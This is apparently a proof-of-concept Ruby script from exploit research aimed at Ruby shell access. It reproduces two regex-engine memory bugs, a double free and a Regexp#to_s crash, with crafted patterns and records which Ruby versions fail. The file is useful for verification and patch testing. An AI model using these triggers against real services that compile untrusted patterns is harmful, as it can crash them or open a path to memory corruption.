#!/usr/bin/env ruby
# Adjacent GHSAs from the same 2026-11-18 Ruby fix series as CVE-2026-132825.
# Neither is the admitted primary bug; both need an application that compiles
# attacker-controlled regular expression patterns, so neither is a stock-Rails
# or stock-Sinatra rung-4/5 path.  Kept as rung-2/rung-3 evidence only.
#
# Usage: ruby ruby2shell-adjacent-ghsas.rb double-free|to-s
#
# double-free (GHSA-7x2q-68qv-6p8x, fix 28aad344e1):
#   parse_char_class frees cc->mbuf on && and leaves the pointer live; the
#   ASCII-intersection error path frees it again.  Vulnerable 3.4.12 ASan
#   reports heap-use-after-free in bbuf_free; fixed 3.4.13 raises RegexpError.
# to-s (GHSA-7whj-cfh7-xgm4, fix cdd499eccd):
#   Regexp#to_s re-parses the raw pattern in (?opts:...) while Regexp.new
#   compiles the preprocessed source.  The upstream regression pattern makes
#   the two disagree and crashes 3.4.12 in onig_parse_make_tree; 3.4.13
#   returns the expected string.
$stdout.sync = true
case ARGV.fetch(0)
when "double-free"
  chars = (0...9999).map { |i| (0x4e00 + 2 * i).chr("UTF-8") }.join
  cc = "[[:^ascii:][^#{chars}]&&[^\\u9fff]&&x]"
  begin
    Regexp.new(cc, Regexp::IGNORECASE)
    puts "NOERROR"
  rescue RegexpError
    puts "REGEXPERROR"
  end
when "to-s"
  re = Regexp.new('(?:[](?#\x{7FFFFFFF})])')
  puts re.to_s.inspect
else
  abort "usage: #{$PROGRAM_NAME} double-free|to-s"
end
